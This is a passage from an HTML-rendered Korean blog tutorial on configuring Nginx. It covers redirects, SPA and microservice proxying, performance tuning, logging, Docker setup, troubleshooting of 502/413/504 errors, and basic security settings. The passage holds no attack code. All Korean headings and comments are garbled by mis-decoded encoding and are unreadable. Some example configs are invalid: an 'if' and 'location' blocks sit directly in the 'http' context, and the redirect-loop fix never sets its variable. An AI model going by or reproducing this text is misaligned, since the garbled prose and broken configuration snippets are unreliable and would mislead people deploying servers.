class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë‹¨ìˆœ ë¦¬ë‹¤ì´ë ‰íŠ¸</span></span><br><span class="line">    <span class="section">location</span> /old-page &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> /new-page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë„ë©”ì¸ ë¦¬ë‹¤ì´ë ‰íŠ¸</span></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> https://newdomain.com<span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Rewrite ê·œì¹™</span></span><br><span class="line">    <span class="section">location</span> /users/ &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/users/(.*)$</span> /user-profile?id=<span class="variable">$1</span> <span class="literal">last</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ì¡°ê±´ë¶€ ë¦¬ë‹¤ì´ë ‰íŠ¸</span></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$host</span> != <span class="string">&#x27;example.com&#x27;</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> https://example.com<span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SPA-Single-Page-Application-ì„¤ì •"><a href="#SPA-Single-Page-Application-ì„¤ì •" class="headerlink" title="SPA (Single Page Application) ì„¤ì •"></a>SPA (Single Page Application) ì„¤ì •</h2><h3 id="React-Vue-Angular-ë°°í¬"><a href="#React-Vue-Angular-ë°°í¬" class="headerlink" title="React&#x2F;Vue&#x2F;Angular ë°°í¬"></a>React&#x2F;Vue&#x2F;Angular ë°°í¬</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> app.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/app/dist;</span><br><span class="line">    <span class="attribute">index</span> index.html;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SPA ë¼ìš°íŒ… ì§€ì›</span></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># API ìš”ì²­ì€ ë°±ì—”ë“œë¡œ í”„ë¡ì‹œ</span></span><br><span class="line">    <span class="section">location</span> /api &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ì •ì  ìì‚° ìºì‹±</span></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$</span> &#123;</span><br><span class="line">        <span class="attribute">expires</span> <span class="number">1y</span>;</span><br><span class="line">        <span class="attribute">add_header</span> Cache-Control <span class="string">&quot;public, immutable&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤-ë¼ìš°íŒ…"><a href="#ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤-ë¼ìš°íŒ…" class="headerlink" title="ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ë¼ìš°íŒ…"></a>ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ë¼ìš°íŒ…</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> api.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Auth Service</span></span><br><span class="line">    <span class="section">location</span> /auth &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://auth-service:8001;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># User Service</span></span><br><span class="line">    <span class="section">location</span> /users &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://user-service:8002;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Order Service</span></span><br><span class="line">    <span class="section">location</span> /orders &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://order-service:8003;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Payment Service</span></span><br><span class="line">    <span class="section">location</span> /payments &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://payment-service:8004;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ì„±ëŠ¥-ìµœì í™”"><a href="#ì„±ëŠ¥-ìµœì í™”" class="headerlink" title="ì„±ëŠ¥ ìµœì í™”"></a>ì„±ëŠ¥ ìµœì í™”</h2><h3 id="1-Worker-í”„ë¡œì„¸ìŠ¤-ìµœì í™”"><a href="#1-Worker-í”„ë¡œì„¸ìŠ¤-ìµœì í™”" class="headerlink" title="1. Worker í”„ë¡œì„¸ìŠ¤ ìµœì í™”"></a>1. Worker í”„ë¡œì„¸ìŠ¤ ìµœì í™”</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CPU ì½”ì–´ ìˆ˜ì— ë§ê²Œ ì„¤ì •</span></span><br><span class="line"><span class="attribute">worker_processes</span> auto;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì›Œì»¤ í”„ë¡œì„¸ìŠ¤ë¥¼ íŠ¹ì • CPUì— ë°”ì¸ë”©</span></span><br><span class="line"><span class="attribute">worker_cpu_affinity</span> auto;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì›Œì»¤ í”„ë¡œì„¸ìŠ¤ë‹¹ íŒŒì¼ ë””ìŠ¤í¬ë¦½í„° ìˆ˜</span></span><br><span class="line"><span class="attribute">worker_rlimit_nofile</span> <span class="number">65535</span>;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="comment"># ì›Œì»¤ë‹¹ ì—°ê²° ìˆ˜ ì¦ê°€</span></span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">4096</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë™ì‹œì— ì—¬ëŸ¬ ì—°ê²° ìˆ˜ë½</span></span><br><span class="line">    <span class="attribute">multi_accept</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># epoll ì‚¬ìš© (Linux)</span></span><br><span class="line">    <span class="attribute">use</span> <span class="literal">epoll</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ë²„í¼-ë°-íƒ€ì„ì•„ì›ƒ-ìµœì í™”"><a href="#2-ë²„í¼-ë°-íƒ€ì„ì•„ì›ƒ-ìµœì í™”" class="headerlink" title="2. ë²„í¼ ë° íƒ€ì„ì•„ì›ƒ ìµœì í™”"></a>2. ë²„í¼ ë° íƒ€ì„ì•„ì›ƒ ìµœì í™”</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="comment"># í´ë¼ì´ì–¸íŠ¸ ìš”ì²­ ë²„í¼</span></span><br><span class="line">    <span class="attribute">client_body_buffer_size</span> <span class="number">128k</span>;</span><br><span class="line">    <span class="attribute">client_max_body_size</span> <span class="number">100M</span>;</span><br><span class="line">    <span class="attribute">client_header_buffer_size</span> <span class="number">1k</span>;</span><br><span class="line">    <span class="attribute">large_client_header_buffers</span> <span class="number">4</span> <span class="number">16k</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># íƒ€ì„ì•„ì›ƒ ì„¤ì •</span></span><br><span class="line">    <span class="attribute">client_body_timeout</span> <span class="number">12</span>;</span><br><span class="line">    <span class="attribute">client_header_timeout</span> <span class="number">12</span>;</span><br><span class="line">    <span class="attribute">keepalive_timeout</span> <span class="number">15</span>;</span><br><span class="line">    <span class="attribute">send_timeout</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># íŒŒì¼ ì „ì†¡ ìµœì í™”</span></span><br><span class="line">    <span class="attribute">sendfile</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">tcp_nopush</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">tcp_nodelay</span> <span class="literal">on</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-ì••ì¶•-ìµœì í™”"><a href="#3-ì••ì¶•-ìµœì í™”" class="headerlink" title="3. ì••ì¶• ìµœì í™”"></a>3. ì••ì¶• ìµœì í™”</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">gzip</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">gzip_vary</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">gzip_proxied</span> any;</span><br><span class="line">    <span class="attribute">gzip_comp_level</span> <span class="number">6</span>;</span><br><span class="line">    <span class="attribute">gzip_min_length</span> <span class="number">1000</span>;</span><br><span class="line">    <span class="attribute">gzip_disable</span> <span class="string">&quot;msie6&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">gzip_types</span></span><br><span class="line">        text/plain</span><br><span class="line">        text/css</span><br><span class="line">        text/xml</span><br><span class="line">        text/javascript</span><br><span class="line">        application/json</span><br><span class="line">        application/javascript</span><br><span class="line">        application/xml+rss</span><br><span class="line">        application/rss+xml</span><br><span class="line">        font/truetype</span><br><span class="line">        font/opentype</span><br><span class="line">        application/vnd.ms-fontobject</span><br><span class="line">        image/svg+xml;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ëª¨ë‹ˆí„°ë§-ë°-ë¡œê¹…"><a href="#ëª¨ë‹ˆí„°ë§-ë°-ë¡œê¹…" class="headerlink" title="ëª¨ë‹ˆí„°ë§ ë° ë¡œê¹…"></a>ëª¨ë‹ˆí„°ë§ ë° ë¡œê¹…</h2><h3 id="1-ì•¡ì„¸ìŠ¤-ë¡œê·¸-ì»¤ìŠ¤í„°ë§ˆì´ì§•"><a href="#1-ì•¡ì„¸ìŠ¤-ë¡œê·¸-ì»¤ìŠ¤í„°ë§ˆì´ì§•" class="headerlink" title="1. ì•¡ì„¸ìŠ¤ ë¡œê·¸ ì»¤ìŠ¤í„°ë§ˆì´ì§•"></a>1. ì•¡ì„¸ìŠ¤ ë¡œê·¸ ì»¤ìŠ¤í„°ë§ˆì´ì§•</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="comment"># ìƒì„¸í•œ ë¡œê·¸ í˜•ì‹ ì •ì˜</span></span><br><span class="line">    <span class="attribute">log_format</span> detailed <span class="string">&#x27;<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] &#x27;</span></span><br><span class="line">                       <span class="string">&#x27;&quot;<span class="variable">$request</span>&quot; <span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> &#x27;</span></span><br><span class="line">                       <span class="string">&#x27;&quot;<span class="variable">$http_referer</span>&quot; &quot;<span class="variable">$http_user_agent</span>&quot; &#x27;</span></span><br><span class="line">                       <span class="string">&#x27;rt=<span class="variable">$request_time</span> uct=&quot;<span class="variable">$upstream_connect_time</span>&quot; &#x27;</span></span><br><span class="line">                       <span class="string">&#x27;uht=&quot;<span class="variable">$upstream_header_time</span>&quot; urt=&quot;<span class="variable">$upstream_response_time</span>&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># JSON ë¡œê·¸ í˜•ì‹</span></span><br><span class="line">    <span class="attribute">log_format</span> json escape=json <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">        <span class="string">&#x27;&quot;time&quot;:&quot;<span class="variable">$time_iso8601</span>&quot;,&#x27;</span></span><br><span class="line">        <span class="string">&#x27;&quot;remote_addr&quot;:&quot;<span class="variable">$remote_addr</span>&quot;,&#x27;</span></span><br><span class="line">        <span class="string">&#x27;&quot;request&quot;:&quot;<span class="variable">$request</span>&quot;,&#x27;</span></span><br><span class="line">        <span class="string">&#x27;&quot;status&quot;:<span class="variable">$status</span>,&#x27;</span></span><br><span class="line">        <span class="string">&#x27;&quot;body_bytes_sent&quot;:<span class="variable">$body_bytes_sent</span>,&#x27;</span></span><br><span class="line">        <span class="string">&#x27;&quot;request_time&quot;:<span class="variable">$request_time</span>,&#x27;</span></span><br><span class="line">        <span class="string">&#x27;&quot;upstream_response_time&quot;:&quot;<span class="variable">$upstream_response_time</span>&quot;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/access.log detailed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-Status-í˜ì´ì§€-í™œì„±í™”"><a href="#2-Status-í˜ì´ì§€-í™œì„±í™”" class="headerlink" title="2. Status í˜ì´ì§€ í™œì„±í™”"></a>2. Status í˜ì´ì§€ í™œì„±í™”</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">8080</span>;</span><br><span class="line">    <span class="attribute">server_name</span> localhost;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> /nginx_status &#123;</span><br><span class="line">        <span class="attribute">stub_status</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">access_log</span> <span class="literal">off</span>;</span><br><span class="line">        <span class="attribute">allow</span> <span class="number">127.0.0.1</span>;</span><br><span class="line">        <span class="attribute">deny</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dockerì™€-Nginx"><a href="#Dockerì™€-Nginx" class="headerlink" title="Dockerì™€ Nginx"></a>Dockerì™€ Nginx</h2><h3 id="Dockerfile-ì˜ˆì œ"><a href="#Dockerfile-ì˜ˆì œ" class="headerlink" title="Dockerfile ì˜ˆì œ"></a>Dockerfile ì˜ˆì œ</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx:alpine</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì»¤ìŠ¤í…€ ì„¤ì • íŒŒì¼ ë³µì‚¬</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> nginx.conf /etc/nginx/nginx.conf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> conf.d/ /etc/nginx/conf.d/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì •ì  íŒŒì¼ ë³µì‚¬</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> dist/ /usr/share/nginx/html/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># í¬íŠ¸ ë…¸ì¶œ</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span> <span class="number">443</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;nginx&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;daemon off;&quot;</span>]</span></span><br></pre></td></tr></table></figure><h3 id="docker-compose-yml-ì˜ˆì œ"><a href="#docker-compose-yml-ì˜ˆì œ" class="headerlink" title="docker-compose.yml ì˜ˆì œ"></a>docker-compose.yml ì˜ˆì œ</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:alpine</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;443:443&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./nginx.conf:/etc/nginx/nginx.conf:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./conf.d:/etc/nginx/conf.d:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./ssl:/etc/nginx/ssl:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./html:/usr/share/nginx/html:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./logs:/var/log/nginx</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">app-network</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">myapp:latest</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">app-network</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">app-network:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br></pre></td></tr></table></figure><h2 id="Nginx-ê´€ë¦¬-ëª…ë ¹ì–´"><a href="#Nginx-ê´€ë¦¬-ëª…ë ¹ì–´" class="headerlink" title="Nginx ê´€ë¦¬ ëª…ë ¹ì–´"></a>Nginx ê´€ë¦¬ ëª…ë ¹ì–´</h2><h3 id="ê¸°ë³¸-ëª…ë ¹ì–´"><a href="#ê¸°ë³¸-ëª…ë ¹ì–´" class="headerlink" title="ê¸°ë³¸ ëª…ë ¹ì–´"></a>ê¸°ë³¸ ëª…ë ¹ì–´</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì„¤ì • í…ŒìŠ¤íŠ¸</span></span><br><span class="line">nginx -t</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì„¤ì • ë¦¬ë¡œë“œ (ë¬´ì¤‘ë‹¨)</span></span><br><span class="line">nginx -s reload</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nginx ì¤‘ì§€</span></span><br><span class="line">nginx -s stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># Graceful ì¢…ë£Œ</span></span><br><span class="line">nginx -s quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nginx ì¬ì‹œì‘</span></span><br><span class="line">systemctl restart nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë²„ì „ í™•ì¸</span></span><br><span class="line">nginx -v</span><br><span class="line">nginx -V  <span class="comment"># ìƒì„¸ ì •ë³´ í¬í•¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì„¤ì • íŒŒì¼ ê²½ë¡œ í™•ì¸</span></span><br><span class="line">nginx -t 2&gt;&amp;1 | grep <span class="string">&quot;configuration file&quot;</span></span><br></pre></td></tr></table></figure><h3 id="ë¡œê·¸-ê´€ë¦¬"><a href="#ë¡œê·¸-ê´€ë¦¬" class="headerlink" title="ë¡œê·¸ ê´€ë¦¬"></a>ë¡œê·¸ ê´€ë¦¬</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ë¡œê·¸ ë¡œí…Œì´ì…˜ ì‹ í˜¸ ì „ì†¡</span></span><br><span class="line">nginx -s reopen</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì‹¤ì‹œê°„ ë¡œê·¸ í™•ì¸</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/nginx/access.log</span><br><span class="line"><span class="built_in">tail</span> -f /var/log/nginx/error.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì—ëŸ¬ ë¡œê·¸ í•„í„°ë§</span></span><br><span class="line">grep <span class="string">&quot;error&quot;</span> /var/log/nginx/error.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># íŠ¹ì • IP ìš”ì²­ í™•ì¸</span></span><br><span class="line">grep <span class="string">&quot;192.168.1.100&quot;</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure><h2 id="íŠ¸ëŸ¬ë¸”ìŠˆíŒ…"><a href="#íŠ¸ëŸ¬ë¸”ìŠˆíŒ…" class="headerlink" title="íŠ¸ëŸ¬ë¸”ìŠˆíŒ…"></a>íŠ¸ëŸ¬ë¸”ìŠˆíŒ…</h2><h3 id="1-502-Bad-Gateway"><a href="#1-502-Bad-Gateway" class="headerlink" title="1. 502 Bad Gateway"></a>1. 502 Bad Gateway</h3><p><strong>ì›ì¸</strong>:</p><ul><li>ë°±ì—”ë“œ ì„œë²„ê°€ ë‹¤ìš´ë˜ì—ˆê±°ë‚˜ ì‘ë‹µí•˜ì§€ ì•ŠìŒ</li><li>ë°©í™”ë²½ì´ ì—°ê²°ì„ ì°¨ë‹¨</li><li>SELinuxê°€ í”„ë¡ì‹œ ì—°ê²°ì„ ì°¨ë‹¨ (CentOS&#x2F;RHEL)</li></ul><p><strong>í•´ê²°</strong>:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ë°±ì—”ë“œ ì„œë²„ ìƒíƒœ í™•ì¸</span></span><br><span class="line">curl http://localhost:3000</span><br><span class="line"></span><br><span class="line"><span class="comment"># SELinux ë¬¸ì œ í•´ê²°</span></span><br><span class="line">setsebool -P httpd_can_network_connect 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë°©í™”ë²½ í™•ì¸</span></span><br><span class="line">iptables -L -n</span><br></pre></td></tr></table></figure><h3 id="2-413-Request-Entity-Too-Large"><a href="#2-413-Request-Entity-Too-Large" class="headerlink" title="2. 413 Request Entity Too Large"></a>2. 413 Request Entity Too Large</h3><p><strong>ì›ì¸</strong>: ì—…ë¡œë“œ íŒŒì¼ í¬ê¸° ì œí•œ ì´ˆê³¼</p><p><strong>í•´ê²°</strong>:</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">client_max_body_size</span> <span class="number">100M</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-504-Gateway-Timeout"><a href="#3-504-Gateway-Timeout" class="headerlink" title="3. 504 Gateway Timeout"></a>3. 504 Gateway Timeout</h3><p><strong>ì›ì¸</strong>: ë°±ì—”ë“œ ì„œë²„ ì‘ë‹µ ì‹œê°„ ì´ˆê³¼</p><p><strong>í•´ê²°</strong>:</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_connect_timeout</span> <span class="number">600s</span>;</span><br><span class="line">    <span class="attribute">proxy_send_timeout</span> <span class="number">600s</span>;</span><br><span class="line">    <span class="attribute">proxy_read_timeout</span> <span class="number">600s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-ë„ˆë¬´-ë§ì€-ë¦¬ë‹¤ì´ë ‰íŠ¸"><a href="#4-ë„ˆë¬´-ë§ì€-ë¦¬ë‹¤ì´ë ‰íŠ¸" class="headerlink" title="4. ë„ˆë¬´ ë§ì€ ë¦¬ë‹¤ì´ë ‰íŠ¸"></a>4. ë„ˆë¬´ ë§ì€ ë¦¬ë‹¤ì´ë ‰íŠ¸</h3><p><strong>ì›ì¸</strong>: ë¬´í•œ ë¦¬ë‹¤ì´ë ‰íŠ¸ ë£¨í”„</p><p><strong>í•´ê²°</strong>:</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># X-Forwarded-Proto í—¤ë” í™•ì¸</span></span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$http_x_forwarded_proto</span> = <span class="string">&quot;https&quot;</span>) &#123;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$https_redirect</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$https_redirect</span> = <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$server_name</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ë³´ì•ˆ-ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤"><a href="#ë³´ì•ˆ-ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤" class="headerlink" title="ë³´ì•ˆ ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤"></a>ë³´ì•ˆ ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤</h2><h3 id="1-ê¸°ë³¸-ë³´ì•ˆ-ì„¤ì •"><a href="#1-ê¸°ë³¸-ë³´ì•ˆ-ì„¤ì •" class="headerlink" title="1. ê¸°ë³¸ ë³´ì•ˆ ì„¤ì •"></a>1. ê¸°ë³¸ ë³´ì•ˆ ì„¤ì •</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="comment"># ì„œë²„ ë²„ì „ ìˆ¨ê¸°ê¸°</span></span><br><span class="line">    <span class="attribute">server_tokens</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë¶ˆí•„ìš”í•œ ë©”ì„œë“œ ì°¨ë‹¨</span></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$request_method</span> !<span class="regexp">~ ^(GET|POST|PUT|DELETE|HEAD)$)</span> &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">405</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># íŠ¹ì • íŒŒì¼ ì ‘ê·¼ ì°¨ë‹¨</span></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ /\.</span> &#123;</span><br><span class="line">        <span class="attribute">deny</span> all;</span><br><span class="line">        <span class="attribute">access_log</span> <span class="literal">off</span>;</span><br><span class="line">        <span class="attribute">log_not_found</span> <span class="literal">off</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë°±ì—… íŒŒì¼ ì ‘ê·¼ ì°¨ë‹¨</span></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ ~$</span> &#123;</span><br><span class="line">        <span class="attribute">deny</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-DDoS-ë°©ì–´"><a href="#2-DDoS-ë°©ì–´" class="headerlink" title="2. DDoS ë°©ì–´"></a>2. DDoS ë°©ì–´</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì—°ê²° ì œí•œ</span></span><br><span class="line"><span class="attribute">limit_conn_zone</span> <span class="variable">$binary_remote_addr</span> zone=conn_limit:<span class="number">10m</span>;</span><br><span class="line"><span class="attribute">limit_req_zone</span> <span class="variable">$binary_remote_addr</span> zone=req_limit:<span class="number">10m</span> rate=10r/s;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="comment"># ë™ì‹œ ì—°ê²° ì œí•œ</span></span><br><span class="line">    <span class="attribute">limit_conn</span> conn_limit <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ìš”ì²­ ë¹ˆë„ ì œí•œ</span></span><br><span class="line">    <span class="attribute">limit_req</span> zone=req_limit burst=<span class="number">20</span> nodelay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-IP-í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸-ë¸”ë™ë¦¬ìŠ¤íŠ¸"><a href="#3-IP-í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸-ë¸”ë™ë¦¬ìŠ¤íŠ¸" class="headerlink" title="3. IP í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸&#x2F;ë¸”ë™ë¦¬ìŠ¤íŠ¸"></a>3. IP í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸&#x2F;ë¸”ë™ë¦¬ìŠ¤íŠ¸</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># íŠ¹ì • IPë§Œ í—ˆìš©</span></span><br><span class="line"><span class="section">location</span> /admin &#123;</span><br><span class="line">    <span class="attribute">allow</span> <span class="number">192.168.1.0</span>/<span class="number">24</span>;</span><br><span class="line">    <span class="attribute">allow</span> <span 